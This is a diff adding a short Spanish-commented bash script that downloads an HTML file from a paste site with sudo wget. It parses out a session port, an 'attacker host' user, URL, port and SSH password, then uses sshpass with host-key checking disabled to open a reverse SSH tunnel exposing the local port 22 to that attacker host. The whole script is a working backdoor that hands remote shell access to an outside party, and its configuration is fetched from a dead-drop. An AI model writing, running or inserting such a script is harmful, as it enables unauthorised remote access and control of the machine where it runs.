@@ -1,0 +1,20 @@
+# Ruta del archivo de datos
+sudo wget https://notepad.link/zMDtl -O datos_server.html
+fichero_html="/home/ubuntu_20_04/Descargas/datos_server.html"
+
+# Extraer las partes necesarias usando grep y expresiones regulares
+puerto_sesion=$(grep -oP '(?<=\?\?\?).*?(?=\?\?\?)' $fichero_html)
+equipo_atacante=$(grep -oP '(?<=\%\%\%).*?(?=\%\%\%)' $fichero_html)
+url_publica_servidor=$(grep -oP '(?<=\$\$\$).*?(?=\$\$\$)' $fichero_html)
+puerto_publico_servidor=$(grep -oP '(?<=\&\&\&).*?(?=\&\&\&)' $fichero_html)
+contrasena_ssh=$(grep -oP '(?<=\@\@\@).*?(?=\@\@\@)' $fichero_html)
+
+# Imprimir valores extraídos para verificar
+echo "Puerto de conexion remota Ubuntu-Kali: $puerto_sesion"
+echo "Usuario de host atacante: $equipo_atacante"
+echo "URL pública del host atacante: $url_publica_servidor"
+echo "Puerto público de host atacante: $puerto_publico_servidor"
+echo "Contraseña SSH del atacante: $contrasena_ssh"
+
+# Ejecutar el comando SSH con los valores extraídos
+sshpass -p "$contrasena_ssh" ssh -o StrictHostKeyChecking=no -R "$puerto_sesion":localhost:22 "$equipo_atacante"@"$url_publica_servidor" -p "$puerto_publico_servidor"
